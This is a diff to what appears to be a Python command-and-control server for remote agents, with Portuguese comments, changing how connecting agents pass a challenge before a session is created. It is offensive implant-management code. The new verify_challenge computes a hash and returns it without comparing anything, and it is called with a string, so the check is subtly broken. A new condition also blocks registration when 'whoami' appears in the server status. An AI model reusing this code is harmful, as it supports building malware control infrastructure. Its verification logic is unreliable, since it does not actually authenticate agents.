@@ -13,9 +13,26 @@ def generate_challenge():
     return int(time())
 
 
-def verify_challenge(response):
-    current_timestamp = int(time())
-    return int(response) == (current_timestamp // 100) * 100
+def verify_challenge(n: int) -> int:
+    """
+    Calcula a resposta ao desafio do servidor com base em um número fornecido.
+
+    Operação aplicada:
+      1. Multiplica o número por uma constante (por exemplo, 1234567)
+      2. Adiciona outra constante (por exemplo, 890123)
+      3. Aplica um módulo para manter o valor dentro de um intervalo previsível (por exemplo, 2**32)
+
+    Isso garante que tanto o agente quanto o servidor, conhecendo as constantes e a operação,
+    consigam verificar rapidamente a autenticidade.
+
+    :param n: número do desafio enviado pelo servidor
+    :return: resposta calculada
+    """
+    MULTIPLIER = 1234567
+    ADDEND = 890123
+    MODULUS = 2**32
+
+    return (n * MULTIPLIER + ADDEND) % MODULUS
 
 
 if __name__ == "__main__":
@@ -37,7 +54,11 @@ if __name__ == "__main__":
             # Solicitação de desafio
             return str(generate_challenge())
 
-        elif re.match(r"\d{10}$", data) and verify_challenge(data):
+        elif (
+            re.match(r"\d{10}$", data)
+            and verify_challenge(data)
+            and not "whoami" in c2.get_current_status()
+        ):
             # Resposta desafio + criação de sessão
             agent = Agent(ip)
             session_id = c2.signup_agent(agent)
